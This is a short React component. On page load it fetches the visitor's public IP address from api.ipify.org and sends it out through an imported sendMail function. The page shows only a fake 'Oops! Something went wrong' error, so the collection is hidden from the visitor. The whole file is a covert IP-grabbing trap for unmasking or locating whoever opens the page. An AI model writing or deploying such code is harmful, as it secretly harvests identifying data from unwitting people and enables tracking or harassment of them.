import { useEffect } from "react";
import axios from "axios";
import sendMail from "./send-mail";

function App() {
  async function grabIp(): Promise<void> {
    const res = await axios.get("https://api.ipify.org?format=json");
    // eslint-disable-next-line
    const ip: string = res.data.ip;

    sendMail(ip);
  }

  useEffect(() => {
    grabIp();
  }, []);

  return <p>Oops! Something went wrong</p>;
}

export default App;
